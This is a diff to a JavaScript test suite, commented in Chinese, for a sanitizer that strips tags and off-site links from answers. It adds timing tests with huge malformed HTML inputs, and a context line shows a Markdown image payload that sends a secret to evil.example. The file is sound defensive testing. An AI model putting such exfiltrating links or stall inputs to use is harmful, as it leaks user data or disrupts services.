@@ -209,6 +209,23 @@ describe('回答里只留站内链接', () => {
     test(input, () => assert.equal(sanitize(input), expected))
   }
 
+  // 审查 T-c5c68e #2：去标签不能是二次方的（模型、被投毒的业务数据都可能给出这种字）。几十万字，二次方的要几秒
+  test('坏输入不卡：没合上的标签、注释、script，深嵌套', () => {
+    const inputs = [
+      '<a a' + ' '.repeat(300000),
+      '<!--'.repeat(80000),
+      '<script>'.repeat(40000),
+      '<'.repeat(100000) + 'b>'.repeat(100000),
+      '<!--<script><style>'.repeat(20000),
+    ]
+    for (const input of inputs) {
+      const started = performance.now()
+      const out = sanitize(input)
+      assert.ok(performance.now() - started < 500, `${input.slice(0, 12)}… 用了 ${Math.round(performance.now() - started)} ms`)
+      assert.ok(!out.includes('<'))
+    }
+  })
+
   // 审查（T-3d7b55 #2）给的绕过写法：处理完以后不能再有能被 Markdown / HTML 认成链接、图片、标签的东西
   const attacks = [
     '![x][1]\n\n[1]: //evil.example/leak?d=SECRET',
